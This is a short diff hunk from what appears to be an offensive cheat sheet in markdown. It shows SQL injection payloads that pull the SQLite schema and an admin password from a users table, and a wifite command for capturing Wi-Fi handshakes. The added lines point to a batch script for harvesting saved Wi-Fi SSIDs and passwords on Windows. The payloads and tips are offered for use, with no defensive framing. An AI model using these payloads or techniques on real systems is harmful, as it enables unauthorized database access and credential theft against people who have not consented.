@@ -55,6 +55,11 @@ test ' || (select sql from sqlite_master) || '
 test '|| (select password from xde43_users where role="admin" ) ||'
 ```
 # WIFI CRACK:
+
+
+user *wi.bat* on windows to collect wifi SSID and passwords
+
+
 *to catpture hadshack:*
 	
 	wifite -i wlan1
